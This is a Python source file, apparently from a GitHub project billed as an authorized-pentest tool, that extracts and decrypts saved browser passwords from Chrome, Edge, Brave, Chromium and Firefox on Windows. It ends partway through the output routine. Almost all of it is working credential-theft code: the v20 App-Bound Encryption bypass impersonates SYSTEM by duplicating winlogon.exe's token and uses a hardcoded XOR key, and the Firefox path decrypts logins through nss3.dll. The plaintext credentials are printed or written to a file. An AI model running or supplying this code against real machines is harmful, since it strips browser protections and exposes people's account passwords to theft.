#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
chrome_xtract.py
================
Browser Password Extractor — mohanmg04/browser-data-extractor
https://github.com/mohanmg04/browser-data-extractor

Extracts saved passwords from Chromium-based browsers and Firefox.
For authorized penetration testing and security research only.

Supported Browsers
------------------
  chrome    Google Chrome
  edge      Microsoft Edge
  brave     Brave Browser
  chromium  Chromium
  cft       Chrome for Testing
  firefox   Mozilla Firefox

Encryption Support
------------------
  Chromium v10  →  DPAPI (current-user scope)
  Chromium v20  →  App-Bound Encryption (requires Admin / SYSTEM)
  Firefox        →  NSS / PK11SDR_Decrypt via nss3.dll

Requirements
------------
  pip install cryptography
  Firefox must be installed for firefox mode

Usage
-----
  python chrome_xtract.py -Browser chrome
  python chrome_xtract.py -Browser firefox
  python chrome_xtract.py -Browser edge    -Output passwords.json
  python chrome_xtract.py -Browser brave   -Verbose
  python chrome_xtract.py -Browser firefox -Output firefox.csv -HideBanner
"""

import os, sys, gc, json, time, shutil, sqlite3, ctypes, ctypes.wintypes
import tempfile, argparse
from base64 import b64decode

# ── dependency check ──────────────────────────────────────────────────────────
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    sys.exit("[-] Missing dependency:  pip install cryptography")


# =============================================================================
# ANSI colour helpers
# =============================================================================
class C:
    GRN = "\033[92m"
    RED = "\033[91m"
    CYN = "\033[96m"
    YEL = "\033[93m"
    MAG = "\033[95m"
    DIM = "\033[2m"
    BLD = "\033[1m"
    RST = "\033[0m"

    @staticmethod
    def ok(s):   return f"{C.GRN}[+]{C.RST} {s}"
    @staticmethod
    def err(s):  return f"{C.RED}[-]{C.RST} {s}"
    @staticmethod
    def info(s): return f"{C.CYN}[*]{C.RST} {s}"
    @staticmethod
    def warn(s): return f"{C.YEL}[!]{C.RST} {s}"
    @staticmethod
    def head(s): return f"{C.MAG}{C.BLD}{s}{C.RST}"

try:
    ctypes.windll.kernel32.SetConsoleMode(
        ctypes.windll.kernel32.GetStdHandle(-11), 7
    )
except Exception:
    pass


# =============================================================================
# Constants
# =============================================================================
PROCESS_QUERY_INFORMATION = 0x0400
TOKEN_QUERY               = 0x0008
TOKEN_DUPLICATE           = 0x0002
TOKEN_IMPERSONATE         = 0x0004
TOKEN_ADJUST_PRIVILEGES   = 0x0020
SE_PRIVILEGE_ENABLED      = 0x00000002
MAXIMUM_ALLOWED           = 0x02000000
SecurityImpersonation     = 2
TokenImpersonation        = 1
NCRYPT_SILENT_FLAG        = 0x00000040
TH32CS_SNAPPROCESS        = 0x00000002
SYSTEM_SID                = "S-1-5-18"
TokenUser                 = 1

XOR_KEY = bytes.fromhex(
    "CCF8A1CEC56605B8517552BA1A2D061C"
    "03A29E90274FB2FCF59BA4B75C392390"
)

# NCrypt key names per browser — Edge uses its own key, others share Chrome's
BROWSER_NCRYPT_KEYS: dict[str, list[str]] = {
    "chrome":   ["Google Chromekey1"],
    "edge":     ["Microsoft Edgekey1", "Google Chromekey1"],
    "brave":    ["Google Chromekey1"],
    "chromium": ["Google Chromekey1"],
    "cft":      ["Google Chromekey1"],
}

_LAPPDATA  = os.environ.get("LOCALAPPDATA", "")
_APPDATA   = os.environ.get("APPDATA", "")
_PROGFILES = os.environ.get("PROGRAMFILES", r"C:\Program Files")
_PROGFX86  = os.environ.get("PROGRAMFILES(X86)", r"C:\Program Files (x86)")

CHROMIUM_PATHS: dict[str, dict[str, str]] = {
    "chrome":   {
        "local_state": rf"{_LAPPDATA}\Google\Chrome\User Data\Local State",
        "user_data":   rf"{_LAPPDATA}\Google\Chrome\User Data",
    },
    "edge":     {
        "local_state": rf"{_LAPPDATA}\Microsoft\Edge\User Data\Local State",
        "user_data":   rf"{_LAPPDATA}\Microsoft\Edge\User Data",
    },
    "brave":    {
        "local_state": rf"{_LAPPDATA}\BraveSoftware\Brave-Browser\User Data\Local State",
        "user_data":   rf"{_LAPPDATA}\BraveSoftware\Brave-Browser\User Data",
    },
    "chromium": {
        "local_state": rf"{_LAPPDATA}\Chromium\User Data\Local State",
        "user_data":   rf"{_LAPPDATA}\Chromium\User Data",
    },
    "cft": {
        "local_state": rf"{_LAPPDATA}\Google\Chrome for Testing\User Data\Local State",
        "user_data":   rf"{_LAPPDATA}\Google\Chrome for Testing\User Data",
    },
}

FIREFOX_INSTALL_CANDIDATES = [
    rf"{_PROGFILES}\Mozilla Firefox",
    rf"{_PROGFX86}\Mozilla Firefox",
    rf"{_LAPPDATA}\Mozilla Firefox",
]

FIREFOX_PROFILES_DIR = rf"{_APPDATA}\Mozilla\Firefox\Profiles"

BROWSER_DISPLAY = {
    "chrome":   "Google Chrome",
    "edge":     "Microsoft Edge",
    "brave":    "Brave Browser",
    "chromium": "Chromium",
    "cft":      "Chrome for Testing",
    "firefox":  "Mozilla Firefox",
}

ALL_BROWSERS = list(CHROMIUM_PATHS.keys()) + ["firefox"]


# =============================================================================
# Global verbose flag
# =============================================================================
_V: bool = False

def _log(msg: str) -> None:
    if _V: print(C.info(msg))

def _hex(label: str, data: bytes | None) -> None:
    if _V:
        h = data.hex().upper() if data else "<null>"
        print(C.info(f"{label}: {h}"))


# ─────────────────────────────────────────────────────────────────────────────
# ██████████████████████████  CHROMIUM SECTION  ███████████████████████████████
# ─────────────────────────────────────────────────────────────────────────────

# =============================================================================
# Windows DLL bindings (Chromium)
# =============================================================================
kernel32  = ctypes.WinDLL("kernel32",  use_last_error=True)
advapi32  = ctypes.WinDLL("advapi32",  use_last_error=True)
crypt32   = ctypes.WinDLL("crypt32",   use_last_error=True)
ncryptdll = ctypes.WinDLL("ncrypt")

kernel32.OpenProcess.restype               = ctypes.wintypes.HANDLE
kernel32.OpenProcess.argtypes              = [ctypes.wintypes.DWORD, ctypes.wintypes.BOOL, ctypes.wintypes.DWORD]
kernel32.CloseHandle.restype               = ctypes.wintypes.BOOL
kernel32.CloseHandle.argtypes              = [ctypes.wintypes.HANDLE]
kernel32.GetCurrentProcess.restype         = ctypes.wintypes.HANDLE
kernel32.GetCurrentProcess.argtypes        = []
kernel32.GetCurrentThread.restype          = ctypes.wintypes.HANDLE
kernel32.GetCurrentThread.argtypes         = []
kernel32.LocalFree.restype                 = ctypes.c_void_p
kernel32.LocalFree.argtypes                = [ctypes.c_void_p]
kernel32.CreateToolhelp32Snapshot.restype  = ctypes.wintypes.HANDLE
kernel32.CreateToolhelp32Snapshot.argtypes = [ctypes.wintypes.DWORD, ctypes.wintypes.DWORD]

advapi32.OpenProcessToken.restype          = ctypes.wintypes.BOOL
advapi32.OpenProcessToken.argtypes         = [ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD,
                                               ctypes.POINTER(ctypes.wintypes.HANDLE)]
advapi32.DuplicateTokenEx.restype          = ctypes.wintypes.BOOL
advapi32.DuplicateTokenEx.argtypes         = [ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD,
                                               ctypes.c_void_p, ctypes.c_int, ctypes.c_int,
                                               ctypes.POINTER(ctypes.wintypes.HANDLE)]
advapi32.ImpersonateLoggedOnUser.restype   = ctypes.wintypes.BOOL
advapi32.ImpersonateLoggedOnUser.argtypes  = [ctypes.wintypes.HANDLE]
advapi32.RevertToSelf.restype              = ctypes.wintypes.BOOL
advapi32.RevertToSelf.argtypes             = []
advapi32.OpenThreadToken.restype           = ctypes.wintypes.BOOL
advapi32.OpenThreadToken.argtypes          = [ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD,
                                               ctypes.wintypes.BOOL,
                                               ctypes.POINTER(ctypes.wintypes.HANDLE)]
advapi32.GetTokenInformation.restype       = ctypes.wintypes.BOOL
advapi32.GetTokenInformation.argtypes      = [ctypes.wintypes.HANDLE, ctypes.c_int,
                                               ctypes.c_void_p, ctypes.wintypes.DWORD,
                                               ctypes.POINTER(ctypes.wintypes.DWORD)]
advapi32.ConvertSidToStringSidW.restype    = ctypes.wintypes.BOOL
advapi32.ConvertSidToStringSidW.argtypes   = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_wchar_p)]
advapi32.LookupPrivilegeValueW.restype     = ctypes.wintypes.BOOL
advapi32.LookupPrivilegeValueW.argtypes    = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_void_p]
advapi32.AdjustTokenPrivileges.restype     = ctypes.wintypes.BOOL

ncryptdll.NCryptOpenStorageProvider.restype  = ctypes.c_long
ncryptdll.NCryptOpenStorageProvider.argtypes = [ctypes.POINTER(ctypes.c_void_p),
                                                 ctypes.c_wchar_p, ctypes.wintypes.DWORD]
ncryptdll.NCryptOpenKey.restype              = ctypes.c_long
ncryptdll.NCryptOpenKey.argtypes             = [ctypes.c_void_p,
                                                 ctypes.POINTER(ctypes.c_void_p),
                                                 ctypes.c_wchar_p,
                                                 ctypes.wintypes.DWORD, ctypes.wintypes.DWORD]
ncryptdll.NCryptDecrypt.restype              = ctypes.c_long
ncryptdll.NCryptDecrypt.argtypes             = [ctypes.c_void_p,
                                                 ctypes.POINTER(ctypes.c_ubyte),
                                                 ctypes.wintypes.DWORD,
                                                 ctypes.c_void_p,
                                                 ctypes.POINTER(ctypes.c_ubyte),
                                                 ctypes.wintypes.DWORD,
                                                 ctypes.POINTER(ctypes.wintypes.DWORD),
                                                 ctypes.wintypes.DWORD]
ncryptdll.NCryptFreeObject.restype           = ctypes.c_long
ncryptdll.NCryptFreeObject.argtypes          = [ctypes.c_void_p]


# =============================================================================
# Structures (Chromium)
# =============================================================================
class DATA_BLOB(ctypes.Structure):
    _fields_ = [
        ("cbData", ctypes.wintypes.DWORD),
        ("pbData", ctypes.POINTER(ctypes.c_ubyte)),
    ]

crypt32.CryptUnprotectData.restype  = ctypes.wintypes.BOOL
crypt32.CryptUnprotectData.argtypes = [
    ctypes.POINTER(DATA_BLOB), ctypes.POINTER(ctypes.c_wchar_p),
    ctypes.POINTER(DATA_BLOB), ctypes.c_void_p, ctypes.c_void_p,
    ctypes.wintypes.DWORD, ctypes.POINTER(DATA_BLOB),
]

class LUID(ctypes.Structure):
    _fields_ = [("LowPart", ctypes.wintypes.DWORD), ("HighPart", ctypes.c_long)]

class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [("Luid", LUID), ("Attributes", ctypes.wintypes.DWORD)]

class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [
        ("PrivilegeCount", ctypes.wintypes.DWORD),
        ("Privileges",     LUID_AND_ATTRIBUTES * 1),
    ]

advapi32.AdjustTokenPrivileges.argtypes = [
    ctypes.wintypes.HANDLE, ctypes.wintypes.BOOL,
    ctypes.POINTER(TOKEN_PRIVILEGES), ctypes.wintypes.DWORD,
    ctypes.POINTER(TOKEN_PRIVILEGES), ctypes.POINTER(ctypes.wintypes.DWORD),
]

class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize",              ctypes.wintypes.DWORD),
        ("cntUsage",            ctypes.wintypes.DWORD),
        ("th32ProcessID",       ctypes.wintypes.DWORD),
        ("th32DefaultHeapID",   ctypes.c_size_t),
        ("th32ModuleID",        ctypes.wintypes.DWORD),
        ("cntThreads",          ctypes.wintypes.DWORD),
        ("th32ParentProcessID", ctypes.wintypes.DWORD),
        ("pcPriClassBase",      ctypes.c_long),
        ("dwFlags",             ctypes.wintypes.DWORD),
        ("szExeFile",           ctypes.c_char * 260),
    ]

kernel32.Process32First.restype  = ctypes.wintypes.BOOL
kernel32.Process32First.argtypes = [ctypes.wintypes.HANDLE, ctypes.POINTER(PROCESSENTRY32)]
kernel32.Process32Next.restype   = ctypes.wintypes.BOOL
kernel32.Process32Next.argtypes  = [ctypes.wintypes.HANDLE, ctypes.POINTER(PROCESSENTRY32)]


# =============================================================================
# Privilege helper
# =============================================================================
def enable_privilege(name: str) -> bool:
    token = ctypes.wintypes.HANDLE()
    if not advapi32.OpenProcessToken(
        kernel32.GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        ctypes.byref(token)
    ):
        return False
    try:
        luid = LUID()
        if not advapi32.LookupPrivilegeValueW(None, name, ctypes.byref(luid)):
            return False
        tp = TOKEN_PRIVILEGES()
        tp.PrivilegeCount            = 1
        tp.Privileges[0].Luid       = luid
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
        return bool(advapi32.AdjustTokenPrivileges(
            token, False, ctypes.byref(tp),
            ctypes.sizeof(TOKEN_PRIVILEGES), None, None
        ))
    finally:
        kernel32.CloseHandle(token)


# =============================================================================
# DPAPI
# =============================================================================
def dpapi_unprotect(ciphertext: bytes) -> bytes:
    raw      = (ctypes.c_ubyte * len(ciphertext))(*ciphertext)
    in_blob  = DATA_BLOB(len(ciphertext), raw)
    out_blob = DATA_BLOB()
    ok = crypt32.CryptUnprotectData(
        ctypes.byref(in_blob), None, None, None, None, 0,
        ctypes.byref(out_blob),
    )
    if not ok:
        raise ctypes.WinError(ctypes.get_last_error())
    result = bytes(out_blob.pbData[:out_blob.cbData])
    kernel32.LocalFree(out_blob.pbData)
    return result


# =============================================================================
# SID / identity helpers
# =============================================================================
def get_current_sid() -> str:
    token = ctypes.wintypes.HANDLE()
    got = advapi32.OpenThreadToken(
        kernel32.GetCurrentThread(), TOKEN_QUERY, True, ctypes.byref(token)
    )
    if not got:
        got = advapi32.OpenProcessToken(
            kernel32.GetCurrentProcess(), TOKEN_QUERY, ctypes.byref(token)
        )
    if not got:
        return ""
    try:
        needed = ctypes.wintypes.DWORD(0)
        advapi32.GetTokenInformation(token, TokenUser, None, 0, ctypes.byref(needed))
        buf = (ctypes.c_ubyte * needed.value)()
        if not advapi32.GetTokenInformation(
            token, TokenUser, buf, needed.value, ctypes.byref(needed)
        ):
            return ""
        sid_ptr = ctypes.cast(buf, ctypes.POINTER(ctypes.c_size_t))[0]
        sid_str = ctypes.c_wchar_p()
        if not advapi32.ConvertSidToStringSidW(
            ctypes.c_void_p(sid_ptr), ctypes.byref(sid_str)
        ):
            return ""
        val = sid_str.value or ""
        kernel32.LocalFree(sid_str)
        return val
    finally:
        kernel32.CloseHandle(token)

def is_system() -> bool: return get_current_sid() == SYSTEM_SID
def is_admin()  -> bool:
    try:    return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except: return False


# =============================================================================
# Process enumeration
# =============================================================================
def get_pid_by_name(exe_name: str) -> int:
    name_b = exe_name.lower().encode()
    snap   = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    INVALID = ctypes.cast(-1, ctypes.wintypes.HANDLE).value
    if snap == INVALID:
        return 0
    try:
        entry = PROCESSENTRY32()
        entry.dwSize = ctypes.sizeof(PROCESSENTRY32)
        if kernel32.Process32First(snap, ctypes.byref(entry)):
            while True:
                if entry.szExeFile.lower() == name_b:
                    return entry.th32ProcessID
                if not kernel32.Process32Next(snap, ctypes.byref(entry)):
                    break
    finally:
        kernel32.CloseHandle(snap)
    return 0


# =============================================================================
# SYSTEM impersonation
# =============================================================================
def invoke_impersonate() -> bool:
    if is_system():
        _log("Already running as SYSTEM")
        return True

    _log("Enabling SeDebugPrivilege...")
    enable_privilege("SeDebugPrivilege")

    winlogon_pid = get_pid_by_name("winlogon.exe")
    if not winlogon_pid:
        print(C.err("winlogon.exe not found"))
        return False

    _log(f"winlogon.exe PID → {winlogon_pid}")
    proc_h = tok_h = dup_h = None
    try:
        ph = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, winlogon_pid)
        if not ph:
            print(C.err(f"OpenProcess failed: {ctypes.get_last_error()}")); return False
        proc_h = ph

        tok = ctypes.wintypes.HANDLE()
        if not advapi32.OpenProcessToken(proc_h, TOKEN_QUERY | TOKEN_DUPLICATE, ctypes.byref(tok)):
            print(C.err(f"OpenProcessToken failed: {ctypes.get_last_error()}")); return False
        tok_h = tok.value

        dup = ctypes.wintypes.HANDLE()
        if not advapi32.DuplicateTokenEx(
            tok_h, MAXIMUM_ALLOWED, None,
            SecurityImpersonation, TokenImpersonation, ctypes.byref(dup)
        ):
            print(C.err(f"DuplicateTokenEx failed: {ctypes.get_last_error()}")); return False
        dup_h = dup.value

        if not advapi32.ImpersonateLoggedOnUser(dup_h):
            print(C.err(f"ImpersonateLoggedOnUser failed: {ctypes.get_last_error()}")); return False

        if is_system():
            _log("Impersonated NT AUTHORITY\\SYSTEM")
            return True
        print(C.err(f"Impersonation check failed — SID: {get_current_sid()}")); return False

    except Exception as exc:
        print(C.err(f"invoke_impersonate: {exc}")); return False
    finally:
        if dup_h:  kernel32.CloseHandle(dup_h)
        if tok_h:  kernel32.CloseHandle(tok_h)
        if proc_h: kernel32.CloseHandle(proc_h)


# =============================================================================
# NCrypt
# =============================================================================
def _ncrypt_decrypt_with_key(input_data: bytes, key_name: str) -> bytes:
    """Low-level NCrypt decrypt — tries one specific key name."""
    PROVIDER = "Microsoft Software Key Storage Provider"
    prov_h = ctypes.c_void_p(0)
    key_h  = ctypes.c_void_p(0)
    try:
        st = ncryptdll.NCryptOpenStorageProvider(ctypes.byref(prov_h), PROVIDER, 0)
        if st != 0: raise RuntimeError(f"NCryptOpenStorageProvider: 0x{st & 0xFFFFFFFF:08X}")

        st = ncryptdll.NCryptOpenKey(prov_h, ctypes.byref(key_h), key_name, 0, 0)
        if st != 0: raise RuntimeError(f"NCryptOpenKey({key_name!r}): 0x{st & 0xFFFFFFFF:08X}")

        in_buf = (ctypes.c_ubyte * len(input_data))(*input_data)
        out_sz = ctypes.wintypes.DWORD(0)
        st = ncryptdll.NCryptDecrypt(
            key_h, in_buf, len(input_data), None, None, 0,
            ctypes.byref(out_sz), NCRYPT_SILENT_FLAG,
        )
        if st != 0: raise RuntimeError(f"NCryptDecrypt size ({key_name!r}): 0x{st & 0xFFFFFFFF:08X}")

        out_buf = (ctypes.c_ubyte * out_sz.value)()
        st = ncryptdll.NCryptDecrypt(
            key_h, in_buf, len(input_data), None,
            out_buf, out_sz.value, ctypes.byref(out_sz), NCRYPT_SILENT_FLAG,
        )
        if st != 0: raise RuntimeError(f"NCryptDecrypt actual ({key_name!r}): 0x{st & 0xFFFFFFFF:08X}")
        return bytes(out_buf[:out_sz.value])
    finally:
        if key_h.value:  ncryptdll.NCryptFreeObject(key_h)
        if prov_h.value: ncryptdll.NCryptFreeObject(prov_h)


def decrypt_with_ncrypt(input_data: bytes, browser: str = "chrome") -> bytes:
    """Try browser-specific NCrypt key names in order, fallback to Chrome key."""
    key_names = BROWSER_NCRYPT_KEYS.get(browser.lower(), ["Google Chromekey1"])
    last_exc: Exception = RuntimeError("No NCrypt key names defined")

    for key_name in key_names:
        try:
            _log(f"Trying NCrypt key: {key_name!r}")
            result = _ncrypt_decrypt_with_key(input_data, key_name)
            _log(f"NCrypt success with key: {key_name!r}")
            return result
        except RuntimeError as exc:
            _log(f"NCrypt key {key_name!r} failed: {exc}")
            last_exc = exc

    raise last_exc


# =============================================================================
# AES-GCM / XOR helpers
# =============================================================================
def aes_gcm_decrypt(key: bytes, iv: bytes, ciphertext: bytes, tag: bytes) -> bytes:
    return AESGCM(key).decrypt(iv, ciphertext + tag, None)

def xor_bytes(a: bytes, b: bytes) -> bytes:
    if len(a) != len(b): raise ValueError(f"XOR length mismatch: {len(a)} vs {len(b)}")
    return bytes(x ^ y for x, y in zip(a, b))


# =============================================================================
# v20 key blob parser + decryptor
# =============================================================================
def parse_chrome_key_blob(blob: bytes) -> dict:
    off = 0
    hdr_len  = int.from_bytes(blob[off:off+4], "little"); off += 4
    header   = blob[off:off+hdr_len];                     off += hdr_len
    con_len  = int.from_bytes(blob[off:off+4], "little"); off += 4
    expected = hdr_len + con_len + 8
    if expected != len(blob):
        raise ValueError(f"Blob length mismatch: expected={expected} got={len(blob)}")
    flag = blob[off]; off += 1
    result = dict(Header=header, Flag=flag, Iv=None, Ciphertext=None, Tag=None, EncryptedAesKey=None)
    if flag in (1, 2):
        result["Iv"]         = blob[off:off+12]; off += 12
        result["Ciphertext"] = blob[off:off+32]; off += 32
        result["Tag"]        = blob[off:off+16]
    elif flag == 3:
        result["EncryptedAesKey"] = blob[off:off+32]; off += 32
        result["Iv"]              = blob[off:off+12]; off += 12
        result["Ciphertext"]      = blob[off:off+32]; off += 32
        result["Tag"]             = blob[off:off+16]
    else:
        raise ValueError(f"Unsupported blob flag: {flag}")
    return result

def decrypt_chrome_key_blob(parsed: dict) -> bytes:
    if parsed["Flag"] != 3:
        raise NotImplementedError(f"Blob flag {parsed['Flag']} not supported")
    if not invoke_impersonate():
        raise PermissionError("Could not impersonate SYSTEM for NCryptDecrypt")
    try:
        raw_aes   = decrypt_with_ncrypt(parsed["EncryptedAesKey"])
        final_aes = xor_bytes(raw_aes, XOR_KEY)
        return aes_gcm_decrypt(final_aes, parsed["Iv"], parsed["Ciphertext"], parsed["Tag"])
    finally:
        advapi32.RevertToSelf()
        _log("RevertToSelf after NCryptDecrypt")


# =============================================================================
# Chromium master key
# =============================================================================
def get_master_key_v10(local_state_path: str) -> bytes:
    with open(local_state_path, encoding="utf-8") as f:
        ls = json.load(f)
    enc = b64decode(ls["os_crypt"]["encrypted_key"])[5:]
    key = dpapi_unprotect(enc)
    _hex("Master key (v10)", key)
    return key

def get_master_key_v20(local_state_path: str) -> bytes:
    if not is_admin() and not is_system():
        raise PermissionError("Admin or SYSTEM rights required for v20 (ABE) decryption")
    with open(local_state_path, encoding="utf-8") as f:
        ls = json.load(f)
    app_enc = b64decode(ls["os_crypt"]["app_bound_encrypted_key"])
    if app_enc[:4] != b"APPB":
        raise ValueError(f"Expected APPB header, got: {app_enc[:4]!r}")
    if not invoke_impersonate():
        raise PermissionError("Failed to impersonate SYSTEM (round 1)")
    try:
        first = dpapi_unprotect(app_enc[4:])
        _log(f"Round-1 output: {len(first)} bytes")
    finally:
        advapi32.RevertToSelf()
        _log("RevertToSelf after round 1")
    second = dpapi_unprotect(first)
    _log(f"Round-2 output: {len(second)} bytes")
    parsed = parse_chrome_key_blob(second)
    _log(f"Key blob flag: {parsed['Flag']}")
    return decrypt_chrome_key_blob(parsed)


# =============================================================================
# Chromium helpers
# =============================================================================
def get_chromium_profile_dirs(user_data: str) -> list[str]:
    profiles = []
    if not os.path.isdir(user_data):
        return profiles
    for name in os.listdir(user_data):
        full = os.path.join(user_data, name)
        if os.path.isdir(full) and os.path.isfile(os.path.join(full, "Login Data")):
            profiles.append(full)
    return sorted(profiles)

def _db_query(db_path: str, tag: str, query: str) -> list[sqlite3.Row]:
    if not os.path.isfile(db_path):
        _log(f"DB not found: {db_path}"); return []
    tmp = os.path.join(tempfile.gettempdir(), f"cxtract_{tag}_{os.urandom(4).hex()}.db")
    try:
        shutil.copy2(db_path, tmp)
    except Exception as exc:
        print(C.err(f"Cannot copy Login Data: {exc}")); return []
    rows: list[sqlite3.Row] = []
    try:
        con = sqlite3.connect(f"file:{tmp}?mode=ro", uri=True)
        con.row_factory = sqlite3.Row
        rows = con.execute(query).fetchall()
        con.close()
    except Exception as exc:
        print(C.err(f"DB query error: {exc}"))
    finally:
        time.sleep(0.15); gc.collect()
        try: os.remove(tmp)
        except OSError: pass
    return rows

def decrypt_blob(raw: bytes, master_key: bytes) -> str | None:
    NONCE_SIZE = 12; TAG_SIZE = 16
    if len(raw) < 3 + NONCE_SIZE + TAG_SIZE + 1 or raw[:3] not in (b"v10", b"v20"):
        return None
    body = raw[3:]
    try:
        return aes_gcm_decrypt(
            master_key, body[:NONCE_SIZE],
            body[NONCE_SIZE:-TAG_SIZE], body[-TAG_SIZE:]
        ).decode("utf-8", errors="replace")
    except Exception:
        return None

def detect_blob_type(user_data: str, browser: str) -> str:
    for prof in get_chromium_profile_dirs(user_data):
        rows = _db_query(
            os.path.join(prof, "Login Data"), browser,
            "SELECT password_value FROM logins LIMIT 5"
        )
        for row in rows:
            raw = bytes(row["password_value"] or b"")
            if raw[:3] == b"v20": return "v20"
            if raw[:3] == b"v10": return "v10"
    return "v10"

def extract_chromium_passwords(profile: str, browser: str, pname: str, master_key: bytes) -> list[dict]:
    rows = _db_query(
        os.path.join(profile, "Login Data"), browser,
        "SELECT signon_realm, origin_url, username_value, password_value FROM logins"
    )
    results = []
    for row in rows:
        url  = row["signon_realm"] or row["origin_url"] or ""
        user = row["username_value"] or ""
        blob = bytes(row["password_value"] or b"")
        if not url or not blob: continue
        pw = decrypt_blob(blob, master_key)
        if pw is None: continue
        results.append({"Profile": pname, "URL": url, "Username": user, "Password": pw})
    return results


# ─────────────────────────────────────────────────────────────────────────────
# ██████████████████████████  FIREFOX SECTION  ████████████████████████████████
# ─────────────────────────────────────────────────────────────────────────────

# =============================================================================
# NSS structure
# =============================================================================
class SECItem(ctypes.Structure):
    _fields_ = [
        ("type", ctypes.c_uint),
        ("data", ctypes.POINTER(ctypes.c_ubyte)),
        ("len",  ctypes.c_uint),
    ]


# =============================================================================
# Firefox install + profile discovery
# =============================================================================
def get_firefox_install_path() -> str:
    for path in FIREFOX_INSTALL_CANDIDATES:
        if os.path.isfile(os.path.join(path, "nss3.dll")):
            _log(f"Firefox install found: {path}")
            return path
    return ""

def get_firefox_profiles() -> list[str]:
    if not os.path.isdir(FIREFOX_PROFILES_DIR):
        return []
    profiles = []
    for name in os.listdir(FIREFOX_PROFILES_DIR):
        full = os.path.join(FIREFOX_PROFILES_DIR, name)
        if os.path.isdir(full) and os.path.isfile(os.path.join(full, "logins.json")):
            profiles.append(full)
    return sorted(profiles)


# =============================================================================
# NSS loader
# =============================================================================
def load_nss(firefox_path: str) -> ctypes.CDLL:
    # Add Firefox dir to DLL search path so nss3.dll can find its own deps
    try:
        os.add_dll_directory(firefox_path)
    except (AttributeError, OSError):
        os.environ["PATH"] = firefox_path + ";" + os.environ.get("PATH", "")

    nss3 = ctypes.CDLL(os.path.join(firefox_path, "nss3.dll"))

    nss3.NSS_Init.restype        = ctypes.c_int
    nss3.NSS_Init.argtypes       = [ctypes.c_char_p]
    nss3.NSS_Shutdown.restype    = ctypes.c_int
    nss3.NSS_Shutdown.argtypes   = []
    nss3.PK11SDR_Decrypt.restype = ctypes.c_int
    nss3.PK11SDR_Decrypt.argtypes = [
        ctypes.POINTER(SECItem),
        ctypes.POINTER(SECItem),
        ctypes.c_void_p,
    ]
    nss3.SECITEM_FreeItem.restype  = None
    nss3.SECITEM_FreeItem.argtypes = [ctypes.POINTER(SECItem), ctypes.c_int]

    return nss3


# =============================================================================
# NSS decrypt one base64 blob
# =============================================================================
def nss_decrypt(nss3: ctypes.CDLL, b64_value: str) -> str | None:
    try:
        raw = b64decode(b64_value)
    except Exception:
        return None

    buf = (ctypes.c_ubyte * len(raw))(*raw)
    inp = SECItem(0, buf, len(raw))
    out = SECItem(0, None, 0)

    ret = nss3.PK11SDR_Decrypt(ctypes.byref(inp), ctypes.byref(out), None)
    if ret != 0:
        return None

    try:
        if not out.data or not out.len:
            return None
        result = bytes(out.data[:out.len]).decode("utf-8", errors="replace")
        return result
    finally:
        nss3.SECITEM_FreeItem(ctypes.byref(out), 0)


# =============================================================================
# Firefox password extractor (single profile)
# =============================================================================
def extract_firefox_passwords(profile: str, nss3: ctypes.CDLL, pname: str) -> list[dict]:
    logins_path = os.path.join(profile, "logins.json")
    if not os.path.isfile(logins_path):
        return []

    try:
        with open(logins_path, encoding="utf-8") as f:
            data = json.load(f)
    except Exception as exc:
        print(C.err(f"Cannot read logins.json ({profile}): {exc}"))
        return []

    results = []
    for entry in data.get("logins", []):
        url      = entry.get("hostname") or entry.get("formSubmitURL") or ""
        enc_user = entry.get("encryptedUsername", "")
        enc_pass = entry.get("encryptedPassword", "")

        username = nss_decrypt(nss3, enc_user) if enc_user else ""
        password = nss_decrypt(nss3, enc_pass) if enc_pass else ""

        if username is None and password is None:
            continue

        results.append({
            "Profile" : pname,
            "URL"     : url,
            "Username": username or "",
            "Password": password or "",
        })

    return results


# =============================================================================
# Firefox main runner
# =============================================================================
def run_firefox(output: str | None) -> None:
    firefox_path = get_firefox_install_path()
    if not firefox_path:
        print(C.err(
            "nss3.dll not found. Firefox must be installed.\n"
            f"  Checked: {', '.join(FIREFOX_INSTALL_CANDIDATES)}"
        ))
        return

    profiles = get_firefox_profiles()
    if not profiles:
        print(C.err(f"No Firefox profiles found in:\n  {FIREFOX_PROFILES_DIR}"))
        return

    print(C.info(f"Profiles : {len(profiles)} found"))

    try:
        nss3 = load_nss(firefox_path)
        _log(f"nss3.dll loaded from {firefox_path}")
    except Exception as exc:
        print(C.err(f"Failed to load nss3.dll: {exc}"))
        return

    all_passwords: list[dict] = []

    for prof in profiles:
        pname = os.path.basename(prof)
        profile_path_b = prof.encode("utf-8")

        ret = nss3.NSS_Init(profile_path_b)
        if ret != 0:
            print(C.warn(f"NSS_Init failed for {pname} (code {ret}) — skipping"))
            continue

        _log(f"NSS_Init OK for {pname}")

        found = extract_firefox_passwords(prof, nss3, pname)
        _log(f"  {pname}: {len(found)} password(s)")
        all_passwords.extend(found)

        nss3.NSS_Shutdown()
        _log(f"NSS_Shutdown for {pname}")

    print_summary("Mozilla Firefox", len(profiles), len(all_passwords))

    if all_passwords:
        print_table(all_passwords)
        if output:
            save_output(all_passwords, output)
    else:
        print(C.warn("No saved passwords found."))


# ─────────────────────────────────────────────────────────────────────────────
# ██████████████████████████  SHARED OUTPUT  ██████████████████████████████████
# ─────────────────────────────────────────────────────────────────────────────

def print_table(rows: list[dict]) -> None:
    if not rows: return
    cols   = ["Profile", "URL", "Username", "Password"]
    widths = {c: len(c) for c in cols}
    for r in rows:
        for c in cols:
            widths[c] = max(widths[c], len(str(r.get(c, ""))))
    sep = "  "
    hdr = sep.join(f"{c:<{widths[c]}}" for c in cols)
    bar = sep.join("-" * widths[c]      for c in cols)
    print(f"\n{C.head('  ── PASSWORDS ──')}\n")
    print(f"{C.BLD}{hdr}{C.RST}")
